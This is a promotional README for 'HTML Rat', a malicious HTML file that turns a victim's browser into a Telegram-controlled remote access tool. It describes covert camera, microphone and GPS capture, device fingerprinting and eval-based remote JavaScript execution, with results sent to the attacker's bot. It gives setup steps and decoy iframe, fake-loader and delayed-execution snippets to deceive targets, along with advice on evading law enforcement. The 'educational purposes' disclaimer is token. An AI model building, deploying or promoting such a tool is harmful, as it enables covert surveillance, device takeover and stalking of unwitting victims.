# 💀 HTML Rat: The Ultimate Stealth Remote Access Tool

**HTML Rat** is your key to owning any device with just a single HTML file and a Telegram bot. No servers, no traces, pure domination. This is the tool every black-hat hacker dreams of—silent, deadly, and impossible to resist.

---

## Features: Why HTML Rat is Unstoppable

- 📡 **Remote Code Execution (RCE)**: Run any JavaScript on the target’s device like you’re sitting at their keyboard.
- 🌍 **GPS Tracking**: Pinpoint their exact location, down to the street.
- 📸 **Covert Camera Access**: Snap photos or record videos without them knowing.
- 🎤 **Mic Snooping**: Capture every sound in their environment.
- 📊 **Device Fingerprinting**: Harvest everything—IP, browser, battery level, hardware specs, you name it.
- 🛠️ **Slick Telegram Control Panel**: Command your army of compromised devices from a single Telegram bot.

This isn’t just a tool—it’s a weapon for total control.

---

## How It Works: The Technical Black Magic

### Core Architecture

- **HTML File**: The heart of the beast. A single HTML file embeds stealthy JavaScript that activates the moment a victim opens it in their browser.
- **Telegram Bot**: Your command center. All instructions flow through Telegram’s API, and results come back to you instantly.
- **Serverless Stealth**: No need for a dedicated server—everything runs through Telegram’s API, leaving no footprints.

### Workflow Breakdown

1. **Client Registration**:

   - When the victim loads the HTML file, the embedded JavaScript springs into action.
   - The target’s public IP is grabbed via an external API (`https://api.ipify.org`).
   - A detailed device profile is collected, including:
     - **User Agent**: Browser and OS details via `navigator.userAgent`.
     - **Screen Resolution**: `window.screen.width` × `window.screen.height`.
     - **Language**: `navigator.language`.
     - **Hardware**: CPU cores (`navigator.hardwareConcurrency`), memory, and more.
   - This data is sent to your Telegram bot as a notification and compiled into an `info.html` file, uploaded for your viewing pleasure.

2. **Command Processing**:

   - The script polls Telegram’s API using `getUpdates` every few seconds to check for your commands.
   - Send `/panel` to your bot to see a list of all compromised devices, each marked with their IP and online status.
   - Select a device to access a menu with options like executing code, snapping photos, or grabbing GPS data.

3. **Remote Code Execution (RCE)**:

   - In "Run JS" mode, send any JavaScript code through Telegram (e.g., `alert("Owned!")` or something nastier).
   - The script uses `eval()` to execute it directly on the victim’s device.
   - Results (or errors) are sent back to your bot as text or files.

4. **Hardware Access**:

   - **Camera and Mic**: The `navigator.mediaDevices.getUserMedia` API captures photos, videos, or audio streams silently.
   - **GPS**: `navigator.geolocation.getCurrentPosition` fetches precise coordinates. If denied, it falls back to IP-based geolocation using `https://ipapi.co/json`.
   - Captured media or coordinates are sent to your bot as files or text.

5. **Update Loop**:

   - The script runs a `setInterval` loop (every 2 seconds by default) to poll for new Telegram messages, ensuring real-time control.
   - Old updates are flushed to keep the connection clean and avoid rate limits.

### Technical Deep Dive

- **Telegram API**: Uses `sendMessage`, `sendPhoto`, `sendDocument`, and `getUpdates` via `fetch` for seamless communication.
- **Error Handling**: If the victim denies camera or GPS access, the script reports "Access Denied" to your bot.
- **Optimization**: Polling is used for simplicity, but you could swap to Webhooks for faster response times (not implemented here).

---

## Setup: Unleash the Beast

### Step 1: Create Your Telegram Bot

1. Open Telegram and message **@BotFather**.
2. Send `/newbot`, choose a name, and grab the bot token.
3. Keep that token safe—it’s your key to the kingdom.

### Step 2: Configure HTML Rat

1. Open `index.html` in a text editor.

2. Find this line:

   ```javascript
   const BOT_TOKEN = 'YOUR TELEGRAM BOT TOKEN';
   ```

   Replace `'YOUR TELEGRAM BOT TOKEN'` with your bot’s token.

3. Find your Telegram user ID:

   - Message **@userinfobot** and send `/start`.
   - Copy the numeric ID it gives you.

4. In `index.html`, locate:

   ```javascript
   const ADMIN_CHAT_ID = 59539XXXXX;
   ```

   Replace `59539XXXXX` with your numeric ID.

### Step 3: Deploy the Trap

- Host the `index.html` file on an HTTPS server (e.g., GitHub Pages, Netlify). HTTPS is mandatory for camera and mic access.
- Trick the target into opening the file in their browser. Once they do, they’re yours.

---

## Usage: Own the Target

- When a victim opens the HTML file, your bot pings you with their details.
- Commands:
  - `/panel`: Lists all connected devices.
  - **Show info**: Dumps a full device profile.
  - **Run JS**: Executes your JavaScript code.
  - **Get GPS**: Tracks their location.
  - **Take Photo**: Snaps a covert picture.
  - **Record Video**: Grabs a 10-second video.
  - **Record Audio**: Captures ambient sound.

---

## Security & Stealth Tips

- **Browser Permissions**: Most browsers (Chrome, Firefox, etc.) require user consent for camera, mic, or GPS access. This could tip off a suspicious target.
- **Cover Your Tracks**: The bot token and your Telegram ID can be traced by law enforcement. **Never use your personal account.** Create a throwaway Telegram account and delete the bot token after your operation to stay ghosted.

---

## Customization: Keep the Target Clueless

To make the HTML file look legit and avoid suspicion, tweak its appearance in `index.html`:

- **Embed an iframe**: Display a real website to distract the target:

  ```html
  <iframe src="https://example.com" style="width:100%; height:100%; border:none;"></iframe>
  ```

- **Fake Loading Screen**: Make it look like a legit page is loading:

  ```html
  <div style="text-align:center; padding:50px;">
    <h2>Loading...</h2>
    <p>Please wait, content is being fetched.</p>
  </div>
  ```

- **Delay Execution**: Add a delay to the script to keep the target engaged:

  ```javascript
  setTimeout(async () => {
    await registerClient();
    await flushUpdates();
    setInterval(handleUpdates, 2000);
  }, 10000); // 10-second delay
  ```

These tricks buy you time while the script works its magic in the background.

---

## Why HTML Rat?

- **Stealth Mode**: No server, just a single HTML file.
- **Universal**: Works on any device with a browser.
- **Unlimited Power**: Full hardware and data access.
- **Dead Simple**: Controlled entirely from Telegram.

---

## Disclaimer

This tool is for educational purposes only. Unauthorized use is illegal and unethical. You’re on your own if you cross the line.

---

**Fully created by GitHub.com/mr-r0ot.**
